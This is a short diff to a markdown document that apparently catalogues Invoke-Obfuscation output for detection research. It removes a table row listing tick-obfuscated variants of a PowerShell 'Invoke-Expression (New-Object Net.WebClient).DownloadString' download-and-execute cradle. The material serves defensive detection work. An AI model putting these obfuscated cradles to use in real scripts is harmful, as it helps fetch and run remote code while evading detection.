@@ -41,12 +41,8 @@ you can copy the results from all cases for one or more obfuscation methods and 
 
 ### TOKEN OBFUSCATION
 [Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
-| Case # | Option | Results | Comments |
-| :---: | :---: | :---: | :---: |
-| 1 | TOKEN\COMMAND\1 | <p> inVoK`E-e`xpRESSi`oN (nEW`-O`Bject Net.WebClient).DownloadString <br> InVO`KE-exPr`e`SS`ION (N`ew-Ob`J`ect Net.WebClient).DownloadString <br> I`NVoke`-`e`XpREs`s`iON (nE`W-ob`Je`ct Net.WebClient).DownloadString </p> | This option basicaly applies ticks |
 
 <table style="word-break: keep-all;">
-
  <tr>
    <th align="center">Case #</th>
    <th align="center">Option</th>
@@ -63,7 +59,6 @@ you can copy the results from all cases for one or more obfuscation methods and 
    </td>
    <td align="left">This option basicaly applies ticks</td>
  </tr>
-
 </table> 
 
 ### STRING OBFUSCATION
